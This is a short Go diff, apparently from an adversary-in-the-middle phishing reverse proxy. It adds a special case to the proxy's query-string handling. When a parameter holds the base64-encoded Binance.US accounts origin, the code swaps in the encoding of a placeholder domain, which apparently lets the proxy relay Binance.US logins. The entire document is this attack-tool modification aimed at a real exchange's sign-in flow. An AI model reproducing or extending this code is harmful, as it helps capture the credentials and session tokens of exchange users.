@@ -475,6 +475,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw.." { // https://accounts.binance.us:443
+								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw" // https://accounts.anydomain.com:443
+							}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
